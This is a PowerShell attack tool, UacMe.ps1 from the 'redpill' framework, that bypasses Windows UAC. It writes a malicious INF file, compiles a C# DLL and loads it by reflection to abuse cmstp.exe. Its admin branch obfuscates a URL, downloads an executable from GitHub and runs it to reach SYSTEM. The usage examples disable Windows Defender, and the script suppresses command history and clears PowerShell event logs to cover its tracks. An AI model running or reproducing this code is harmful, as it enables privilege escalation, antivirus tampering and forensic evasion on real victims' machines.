<#
.SYNOPSIS
   UAC bypass|EOP by dll reflection! (cmstp.exe)

   Author: @_zc00l|@r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: Reflection.Assembly {native}
   Optional Dependencies: none
   PS cmdlet Dev version: v1.3.6

.DESCRIPTION 
   This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass
   using native Powershell [Reflection.Assembly]::Load(IO) technic to load our dll
   and elevate privileges { user -> admin } or to exec one command with admin privs!

.NOTES
   If executed with administrator privileges and the 'Elevate' @argument its sellected,
   then this cmdlet will try to elevate the "cmdline" from admin => NT AUTHORITY\SYSTEM!

.Parameter Action
   Accepts arguments: Bypass, Elevate, Clean

.Parameter Execute
   Accepts the command OR application absoluct path to be executed!

.Parameter Date
   Delete artifacts left behind by is 'CreationTime' (default: today)

.EXAMPLE
   PS C:\> Get-Help .\UacMe.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\UacMe.ps1 -Action Bypass -Execute "regedit.exe"
   Spawns regedit without uac asking for execution confirmation

.EXAMPLE
   PS C:\> .\UacMe.ps1 -Action Elevate -Execute "powershell.exe"
   Local spawns an powershell prompt with administrator privileges!
   
.EXAMPLE
   PS C:\> .\UacMe.ps1 -Action Elevate -Execute "powershell -file $Env:TMP\DisableDefender.ps1 -Action Stop"
   Executes DisableDefender.ps1 script trougth uac bypass module with elevated shell privs {admin}

.EXAMPLE
   PS C:\> .\UacMe.ps1 -Action Clean
   Deletes uac bypass artifacts and powershell eventvwr logs!
   Remark: Admin privileges are required to delete PS logfiles.

.EXAMPLE
   PS C:\> .\UacMe.ps1 -Action Clean -Date "19/04/2021"
   Clean ALL artifacts left behind by this cmdlet by is 'CreationTime'

.INPUTS
   None. You cannot pipe objects into UacMe.ps1

.OUTPUTS
   Payload file written to C:\Windows\Temp\455pj4k3.inf

   Privilege Name                Description                                   State
   ============================= ============================================= ========
   SeShutdownPrivilege           Encerrar o sistema                            Disabled
   SeChangeNotifyPrivilege       Ignorar verificação transversal               Enabled
   SeUndockPrivilege             Remover computador da estação de ancoragem    Disabled
   SeIncreaseWorkingSetPrivilege Aumentar um conjunto de trabalho de processos Disabled
   SeTimeZonePrivilege           Alterar o fuso horário                        Disabled

   UAC State    : Enabled
   UAC Settings : Notify Me
   EOP Trigger  : C:\Users\pedro\AppData\Local\Temp\DavSyncProvider.dll
   cmdline      : powershell -file C:\Users\pedro\AppData\Local\Temp\DisableDefender.ps1 -Action Stop
   
.LINK
   https://github.com/r00t-3xp10it/redpill
   http://woshub.com/run-program-without-admin-password-and-bypass-uac-prompt/
   https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Execute="$PsHome\powershell.exe",
   [string]$Action="False",
   [string]$Date="false"
)


## Local variable declarations
$OSMajor = [environment]::OSVersion.Version.Major
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$Working_Directory = pwd|Select-Object -ExpandProperty Path


If($Action -ieq "False"){## [error] none parameters sellected by cmdlet user!
   Write-Host "`n[error:] This cmdlet requires the use of -Parameters to work!" -ForeGroundColor Red -BackGroundColor Black
   Write-Host "[syntax] Get-Help .\UacMe.ps1 -full`n" -ForegroundColor Yellow
   exit ## Exit @UacMe
}


If($Action -ieq "Bypass"){

   <#
   .SYNOPSIS
      Helper - Bypass UAC execution confirmation!

   .DESCRIPTION
      This function allow attackers to execute applications
      without beeing bored with uac execution confirmation prompt

   .NOTES
      Required dependencies: RUNASINVOKER API {native}
      Remark: This function does NOT elevate process privileges!

   .EXAMPLE
      PS C:\> .\UacMe.ps1 -Action Bypass -Execute "regedit.exe"
      Spawns regedit without uac asking for execution confirmation

   .OUTPUTS
      Bypass UAC execution confirmation!
      ----------------------------------
      Trigger: C:\Users\pedro\AppData\Local\Temp\GyCgIuT.bat
      Execute: regedit.exe
   #>


## Create Trigger Batch script
$RawBATcript = @(":: Author: @r00t-3xp10it
:: Framework: @redpill - UacMe.ps1
@echo off
set __COMPAT_LAYER=RUNASINVOKER
start `"`" `"$Execute`"
exit")


   ## Build Output Table
   Write-Host "`n`nBypass UAC execution confirmation!" -ForeGroundColor Green
   Write-Host "----------------------------------"

   ## Write Source.bat script into %tmp% directory!
   $RandomMe = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
   echo "$RawBATcript"|Out-File "$Env:TMP\$RandomMe.bat" -encoding ascii -force

   If(Test-Path -Path "$Env:TMP\$RandomMe.bat" -EA SilentlyContinue){

      ## Execute trigger batch script
      Write-Host "Trigger: $Env:TMP\$RandomMe.bat"
      Write-Host "Execute: $Execute"
      Start-Sleep -Seconds 1 ## Give some time for display
      Start-Process -FilePath "$Env:TMP\$RandomMe.bat"

   }Else{## [error] fail to create Trigger.bat
   
      Write-Host "[error] fail to create $RandomMe.bat`n`n" -ForegroundColor Red -BackgroundColor Black
      exit ## Exit @UacMe
   
   }

   Start-Sleep -Seconds 1
   ## Delete artifacts left behind!
   If(Test-Path -Path "$Env:TMP\$RandomMe.bat"){
      Remove-Item -Path "$Env:TMP\$RandomMe.bat" -Force
   }

}


If($Action -ieq "Elevate"){

   <#
   .SYNOPSIS
      Helper - UAC bypass|EOP by dll reflection! (cmstp.exe)
   
   .DESCRIPTION
      This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass
      using native Powershell [Reflection.Assembly]::Load(IO) technic to load our dll
      and elevate privileges { user -> admin } or to exec one command with admin privs!
      
   .NOTES
      Required dependencies: Source.sc { auto-Build }
      Required dependencies: Reflection.Assembly {native}
      Required dependencies: DavSyncProvider.dll { auto-Build }

   .NOTES
      If executed with administrator privileges and the 'Elevate' @argument its sellected,
      then this cmdlet will try to elevate the "cmdline" from admin => NT AUTHORITY\SYSTEM!
   
   .EXAMPLE
      PS C:\> .\UacMe.ps1 -Action Elevate -Execute "powershell.exe"
      Local spawns an powershell prompt with administrator privileges!
      
   .EXAMPLE
      PS C:\> .\UacMe.ps1 -Action Elevate -Execute "cmd /c Reg Add 'HKLM\Software\Policies\Microsoft\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
      Disables Windows Defender { permanent - does not start with PC restart } by adding a registry key to HKLM hive!
   #>
   

   $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
   If($IsClientAdmin){## From administrator => NT AUTHORITY\SYSTEM
      Write-Host "[admin] Elevating privileges to NT AUTHORITY\SYSTEM!`n" -ForeGroundColor Yellow
   
      ## Download and masquerade the required standalone executable
      $Cristovao = "r0$!0&@t-3$!xp&@10i$!t/re&@dpi$!ll/" + "m$!a&@in/u$!t&@ils/N$!&@Su&@$!d&@o.e$!x&@e" -Join ''
      If(-not(Test-Path -Path "$Env:TMP\sdiagschd.msc" -EA SilentlyContinue)){$Colombo = $Cristovao.Split("&@").split("$!") -Join ''
         iwr -Uri https://raw.githubusercontent.com/${Colombo} -OutFile $Env:TMP\sdiagschd.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
      }

      If(-not(Test-Path -Path "$Env:TMP\sdiagschd.msc" -EA SilentlyContinue)){

         Write-Host "[error] fail to download: $Env:TMP\sdiagschd.msc!`n`n" -ForegroundColor Red -BackgroundColor Black
         exit ## Exit @redpill

      }Else{## Execute Binary to elevate shell to NT AUTHORITY\SYSTEM

         cd $Env:TMP;.\sdiagschd.msc -U:T -P:E $Execute
         cd $Working_Directory ## Return to @UacMe working directory

      }


      ## Get privileges info
      $ShellPriv = whoami /priv
      $ParseData = $ShellPriv -replace 'PRIVILEGES INFORMATION','' -replace '----------------------',''
      Write-Host "`nPrivilege Name                            Description                                                           State"
      Write-Host "========================================= ===================================================================== ========"
      echo $ParseData > $Env:TMP\graca.log;Get-Content -Path "$Env:TMP\graca.log" | Where-Object { 
         $_ -iMatch 'Enabled' -and $_ -ne "" } ## filter only Enabled privileges!

      $RawPolicyKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system" -Join ''
      $UacStatus = (Get-ItemProperty -Path "$RawPolicyKey" -EA SilentlyContinue).EnableLUA
      If($UacStatus -eq "0"){$UacStatus = "Disabled"}Else{$UacStatus = "Enabled"}

      ## Build Output Table
      Write-Host "`nUAC State    : $UacStatus"
      Write-Host "EOP Trigger  : $Env:TMP\sdiagschd.msc"
      Write-Host "Execute      : $Execute`n`n"
   
      ## Clean ALL artifacts left behind!
      Remove-Item -Path "$Env:TMP\graca.log" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\sdiagschd.msc" -EA SilentlyContinue -Force

   exit ## Exit @UacMe
   }## End of 'admin => system' function!

   
   ## Delete files left behind by this cmdlet in previous runs!
   If(Test-Path -Path "$Env:TMP\DavSyncProvider.dll" -EA SilentlyContinue){
      Remove-Item -Path "$Env:TMP\DavSyncProvider.dll" -Force  
   }   


## Create Source.cs script
$RawCSScript = @("
/* 
Author: Andre Marques (@_zc00l)
Framework: @redpill - UacMe.ps1
*/

using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Windows;
using System.Runtime.InteropServices;

public class CMSTPvuln
{
// Our .INF file data!
public static string InfData = @`"[version]
Signature=`$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
`"`"HKLM`"`", `"`"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE`"`", `"`"ProfileInstallPath`"`", `"`"%UnexpectedError%`"`", `"`"`"`"

[Strings]
ServiceName=`"`"CorpVPN`"`"
ShortSvcName=`"`"CorpVPN`"`"

`";

    [DllImport(`"user32.dll`")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport(`"user32.dll`", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);

    public static string BinaryPath = `"c:\\windows\\system32\\cmstp.exe`";

    /* Generates a random named .inf file with command to be executed with UAC privileges */
    public static string SetInfFile(string CommandToExecute)
    {
        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar(`".`"))[0];
        string TemporaryDir = `"C:\\Windows\\Temp`";
        StringBuilder OutputFile = new StringBuilder();
        OutputFile.Append(TemporaryDir);
        OutputFile.Append(`"\\`");
        OutputFile.Append(RandomFileName);
        OutputFile.Append(`".inf`");
        StringBuilder newInfData = new StringBuilder(InfData);
        newInfData.Replace(`"REPLACE_COMMAND_LINE`", CommandToExecute);
        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
        return OutputFile.ToString();
    }

    public static bool Execute(string CommandToExecute)
    {
        if(!File.Exists(BinaryPath))
        {
            Console.WriteLine(`"Could not find cmstp.exe binary!`");
            return false;
        }
        StringBuilder InfFile = new StringBuilder();
        InfFile.Append(SetInfFile(CommandToExecute));
        Console.WriteLine(`"Payload file written to `" + InfFile.ToString());
        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
        startInfo.Arguments = `"/au `" + InfFile.ToString();
        startInfo.UseShellExecute = false;
        Process.Start(startInfo);

        IntPtr windowHandle = new IntPtr();
        windowHandle = IntPtr.Zero;
        do {
            windowHandle = SetWindowActive(`"cmstp`");
        } while (windowHandle == IntPtr.Zero);

        System.Windows.Forms.SendKeys.SendWait(`"{ENTER}`");
        return true;
    }

    public static IntPtr SetWindowActive(string ProcessName)
    {
        Process[] target = Process.GetProcessesByName(ProcessName);
        if(target.Length == 0) return IntPtr.Zero;
        target[0].Refresh();
        IntPtr WindowHandle = new IntPtr();
        WindowHandle = target[0].MainWindowHandle;
        if(WindowHandle == IntPtr.Zero) return IntPtr.Zero;
        SetForegroundWindow(WindowHandle);
        ShowWindow(WindowHandle, 5);
        return WindowHandle;
    }
}
")

   ## Write Source.cs script into %tmp% directory!
   $BSDEdit = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
   echo "$RawCSScript"|Out-File "$Env:TMP\$BSDEdit.cs" -Encoding ascii -Force

   ## Get system User Account Control settings
   # [String]::IsNullOrWhiteSpace((Get-Content -Path "$Env:TMP\lksfdv.log" -EA SilentlyContinue))
   $RawPolicyKey = "HKLM:\Software\Microsoft\" + "Windows\CurrentVersion\" + "policies\system" -Join ''
   $ConsentPromptBehaviorAdmin = (Get-Itemproperty -path "$RawPolicyKey" -EA SilentlyContinue).ConsentPromptBehaviorAdmin
   $ConsentPromptBehaviorUser = (Get-Itemproperty -path "$RawPolicyKey" -EA SilentlyContinue).ConsentPromptBehaviorUser
   $UacStatus = (Get-ItemProperty -Path "$RawPolicyKey" -EA SilentlyContinue).EnableLUA   

   ## Parsing UAC Registry Data
   If($ConsentPromptBehaviorAdmin -ieq "5" -and $ConsentPromptBehaviorUser -ieq "3"){
      $UacSettings = "Notify Me" ## Defaul value
   }ElseIf($ConsentPromptBehaviorAdmin -ieq "0" -and $ConsentPromptBehaviorUser -ieq "0"){
      $UacSettings = "Never Notify"
   }ElseIf($ConsentPromptBehaviorAdmin -ieq "2" -and $ConsentPromptBehaviorUser -ieq "3"){
      $UacSettings = "Allways Notify"
   }Else{## Can NOT retrive reg value
      $UacSettings = "`$null"
   }

   If($UacStatus -ieq "0"){## disabled
      $UacStatus = "Disabled"
   }ElseIf($UacStatus -ieq "1"){## enabled
      $UacStatus = "Enabled"
   }Else{## Can NOT retrive reg value
      $UacStatus = "`$null"
   }


   ## Source.cs script compilation to Trigger.dll and execution { EOP }
   If(Test-Path -Path "$Env:TMP\$BSDEdit.cs" -EA SilentlyContinue){
   
      Add-Type -TypeDefinition ([IO.File]::ReadAllText("$Env:TMP\$BSDEdit.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "$Env:TMP\DavSyncProvider.dll"
      If(-not(Test-Path -Path "$Env:TMP\DavSyncProvider.dll" -EA SilentlyContinue)){## Make sure Trigger.dll as created!

         Write-Host "`n`n[error] $Env:TMP\DavSyncProvider.dll not found\created!`n`n" -ForeGroundColor Red -BackGroundColor Black
         exit ## Exit @UacMe
      }

      ## Load Trigger.dll into memory
      [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$Env:TMP\DavSyncProvider.dll"))|Out-Null
      cd $Env:TMP;[CMSTPvuln]::Execute("$Execute")|Out-Null
      cd $Working_Directory ## Return to UacMe working directory!
      
   }Else{## [error] $Env:TMP\Source.cs not found\created!
   
      Write-Host "`n`n[error] $Env:TMP\$BSDEdit.cs not found\created!`n`n" -ForeGroundColor Red -BackGroundColor Black
      exit ## Exit @UacMe
   
   }


   Write-Host "`n"
   ## Get Shell privileges
   $ShellPriv = whoami /priv
   $ParseData = $ShellPriv -replace 'PRIVILEGES INFORMATION','' -replace '----------------------',''
   echo $ParseData > $Env:TMP\graca.log;Get-Content -Path "$Env:TMP\graca.log" | Where-Object { $_ -ne "" }

   ## Build Output Table
   Write-Host "`nUAC State    : $UacStatus"
   Write-Host "UAC Settings : $UacSettings"
   Write-Host "EOP Trigger  : $Env:TMP\DavSyncProvider.dll"
   Write-Host "RUN cmdline  : $Execute`n"
   
   ## Clean ALL artifacts left behind!
   Remove-Item -Path "$Env:TMP\graca.log" -EA SilentlyContinue -Force
   Remove-Item -Path "$Env:TMP\$BSDEdit.cs" -EA SilentlyContinue -Force
   Remove-Item -Path "$Env:TMP\DavSyncProvider.dll" -EA SilentlyContinue -Force  

   $Date = Get-date -Format "dd/MM/yyyy" ## Get todays date: 19/04/2021
   ## This function deletes ALL .inf files from 'C:\Windows\Temp'
   # directory. If the 'CreationTime' of the files Matches todays date!
   $CleanInf = (Get-ChildItem -Path "$Env:WINDIR\temp" -EA SilentlyContinue | Where-Object { 
      $_.CreationTime.ToString() -Match "$Date" -and $_.Name -Match '(.inf)$' 
   }).FullName
   ForEach($Item in $CleanInf){## Delete ALL .inf files from C:\Windows\Temp
      Remove-Item -Path "$Item" -EA SilentlyContinue -Force
   }

}


If($Action -ieq "Clean"){

   <#
   .SYNOPSIS
      Helper - Clean ALL artifacts left behind by this cmdlet!
      
   .NOTES
      If UacMe its executed with administrator privileges
      then it deletes eventvwr powershell logfiles also!

      Remark: This function deletes ALL .inf files from 'C:\Windows\Temp'
      directory. if the 'CreationTime' of the files Matches todays date!
   
   .EXAMPLE
      PS C:\> .\UacMe.ps1 -Action Clean
      Clean ALL artifacts left behind by this cmdlet and deletes eventvwr
      powershell logfiles if this cmdlet its executed with admin privileges!

   .EXAMPLE
      PS C:\> .\UacMe.ps1 -Action Clean -Date "19/04/2021"
      Clean ALL artifacts left behind by this cmdlet by is 'CreationTime'
      
   .EXAMPLE
      PS C:\> .\UacMe.ps1 -Action Elevate -Execute "powershell -file $Env:TMP\UacMe.ps1 -Action Clean"
      Clean ALL artifacts left behind by this cmdlet and delete powershell logfiles using uac bypass technic!
   
   .OUTPUTS
      Artifacts PowershellLogs ShellPrivs
      --------- -------------- ----------
      2         2              Admin

      List of artifacts deleted!
      --------------------------
      C:\WINDOWS\temp\iu3elgrv.inf
      C:\WINDOWS\temp\uf8yrkwo.inf
   #>

   $MyList = $null
   [int]$Artifacts = 0
   ## Clean ALL artifacts left behind!
   If(Test-Path -Path "$Env:TMP\DavSyncProvider.dll" -EA SilentlyContinue){   
      Remove-Item -Path "$Env:TMP\DavSyncProvider.dll" -EA SilentlyContinue -Force
      $Artifacts = $Artifacts+1 ## Count how many artifacts are cleanned!
      $MyList += "$Env:TMP\DavSyncProvider.dll`n" ## Add Entry to $MyList
   }
   If(Test-Path -Path "$Env:TMP\graca.log" -EA SilentlyContinue){   
      Remove-Item -Path "$Env:TMP\graca.log" -EA SilentlyContinue -Force
      $Artifacts = $Artifacts+1 ## Count how many artifacts are cleanned!
      $MyList += "$Env:TMP\graca.log`n" ## Add Entry to $MyList
   }


   If($Date -ieq "false"){## Gets today date
      $Date = Get-date -Format "dd/MM/yyyy" ## Get todays date: 19/04/2021   
   }

   ## This function deletes ALL .cs|.bat|.msc files from '%tmp%'
   # directory. If the 'CreationTime' of the files Matches todays date!
   $CleanInf = (Get-ChildItem -Path "$Env:TMP" -EA SilentlyContinue | Where-Object { 
      $_.CreationTime.ToString() -Match "$Date" -and $_.Name -iMatch '(.cs|.bat|.msc)$' 
   }).FullName
   ForEach($Item in $CleanInf){## Delete ALL .cs|.bat|.msc files from %tmp%
      Remove-Item -Path "$Item" -EA SilentlyContinue -Force
      $Artifacts = $Artifacts+1 ## Count how many artifacts are cleanned!
      $MyList += "$Item`n" ## Add Entry to $MyList
   }

   ## This function deletes ALL .inf files from 'C:\Windows\Temp'
   # directory. If the 'CreationTime' of the files Matches todays date!
   $CleanInf = (Get-ChildItem -Path "$Env:WINDIR\temp" -EA SilentlyContinue | Where-Object { 
      $_.CreationTime.ToString() -Match "$Date" -and $_.Name -Match '(.inf)$' 
   }).FullName
   ForEach($Item in $CleanInf){## Delete ALL .inf files from C:\Windows\Temp
      Remove-Item -Path "$Item" -EA SilentlyContinue -Force
      $Artifacts = $Artifacts+1 ## Count how many artifacts are cleanned!
      $MyList += "$Item`n" ## Add Entry to $MyList
   }
   
   
   [int]$PowershellLogs = 0   
   ## Administrator Privileges cleanning!
   $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
   If($IsClientAdmin){## Clean related eventvwr logfiles

      $CleanWPS = (wevtutil gli "Windows Powershell" | Where-Object { 
         $_ -Match 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''

      If($CleanWPS -gt 0){## Delete ALL Powershell LogFiles
         Write-Host "Eventvwr Windows Powershell Logs Deleted!" -ForeGroundColor Yellow
         wevtutil cl "Windows Powershell" | Out-Null
         $PowershellLogs = $PowershellLogs+1 ## Count how many artifacts are cleanned!         
      }

      $CleanPSo = (wevtutil gli "Microsoft-Windows-Powershell/Operational" | Where-Object { 
         $_ -Match 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''

      If($CleanPSo -gt 0){## Delete ALL Powershell LogFiles
         Write-Host "Eventvwr Powershell/Operational Logs Deleted!" -ForeGroundColor Yellow
         wevtutil cl "Microsoft-Windows-Powershell/Operational" | Out-Null
         $PowershellLogs = $PowershellLogs+1 ## Count how many artifacts are cleanned!
      }

   }
   
   ## read shell current privileges!
   If($IsClientAdmin){$ShellState = "Admin"}Else{$ShellState = "UserLand"}
   
   Write-Host "`n`n"   
   ## Build Output Table
   $mytable = New-Object System.Data.DataTable
   $mytable.Columns.Add("Artifacts")|Out-Null
   $mytable.Columns.Add("PowershellLogs")|Out-Null
   $mytable.Columns.Add("ShellPrivs")|Out-Null   
   $mytable.Rows.Add("$artifacts",
                     "$PowershellLogs",   
                     "$ShellState")|Out-Null

   ## Display Data Table
   $mytable|Format-Table -AutoSize
   Start-Sleep -Seconds 1

   If(-not($MyList -ieq $null)){
      Write-Host "List of artifacts deleted!" -ForeGroundColor Yellow
      Write-Host "--------------------------"
      Write-Host "$MyList`n"
   }

}